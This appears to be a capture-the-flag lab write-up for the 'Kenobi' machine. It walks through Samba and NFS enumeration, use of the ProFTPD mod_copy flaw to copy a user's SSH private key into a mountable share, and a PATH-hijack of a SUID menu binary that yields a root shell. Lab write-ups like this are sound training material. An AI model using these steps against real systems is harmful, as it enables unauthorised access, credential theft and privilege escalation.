# Kenobi

## Nmap scan 
- revealed that samba is being used 
- script to enumerate samba shares 
	```nmap -p 445 --script=smb-enum-shares.nse,smb-enum-users.nse <TARGET_IP>```

### There are two SMB ports 139 and 445 
- Port 139 -> SMB runs on top of NetBIOS on port 139, which is an older transport layer that allows Windows computers to communicate with each other on the same network. 
- Port 445 -> Windows 2000 and newer versions began using port 445 on top of a TCP stack. Using TCP, SMB can work over the internet. 

### Inspecting Samba shares
```smbclient //<TARGET_IP>/anonymous```

### Recursively download SMB Share 
```smbget -R smb://<TARGET_IP>/anonymous

### RPC on port 111 
- nmap scan revealed that port 111 is running **rpcbind** service. 
- this is a server that converts **Remote Procedure Call (RPC)** program number into universal addresses. 
- When an RPC service is started, it tells rpcbind the address at which it is listening and the RPC program number its prepared to server.

- In this case, port 111 is providing access to a **network file system** 

#### Using nmap to enumerate rpc services 
```nmap -p 111 --script=nfs-ls,nfs-statfs,nfs-showmount 10.10.63.61```
- there's a /var mount

### ProFTPD
- trying to find an exploit for ProFTPD 1.3.5 on metasploit
- Found an exploit from ProFtpd's mod_copy module
	- the mod_copy module implements **SITE CPFR** and **SITE CPTO** commands which can be used to 		files/directories from one place to another on the server. 
	- any unauthenticated client can leverage these commands to copy files from any part of the
	  filesystem to a chosen destination. 
- Used CPFR and CPTO commands to copy id_rsa to /tmp/ directory 
getting the target file
```SITE CPFR /home/kenobi/.ssh/id_rsa```
defining the destination folder 
```SITE CPTO /var/tmp/id_rsa```

#### Mounting Kenobi filesystem 
```
sudo mkdir /mnt/kenobiNFS
sudo mount <TARGET_IP>:/var /mnt/kenobiNFS
```

#### copied the id_rsa from /mnt/kenobiNFS/tmp/id_rsa and used it to log into ssh 
- chmod 600 allows only the owner of the file to read and write, once it's done, no one else can access that file
```
cp /mnt/kenobiNFS/tmp/id_rsa .
chmod 600 id_rsa
ssh -i id_rsa kenobi:10.10.63.61
```

## Privilege Escalation 
### Trying to find SUID files
```find / -perm -u=s -type f 2>/dev/null```

.
.
.
/usr/bin/menu 
.
.
.

- Tried running /usr/bin/menu
- curl command is working without a full path
i.e. 
```curl -I localhost``` is working, we don't have to specify the full path something like ```/usr/bin/curl -I localhost```

- as this file runs as the root users privilege, it can be manipulated to gain root shell
- chmod 777 gives all access to everyone

**adding a fake curl script**
```echo /bin/sh > curl```

**making our fake script accessible for everyone**
```chmod 777 curl```

**adding the fake curl to the path**
```export PATH=/tmp:$PATH```

**running /usr/bin/menu whose first option was using the curl command earlier, now it'll use the curl defined in our PATH giving us root shell**
```/usr/bin/menu```
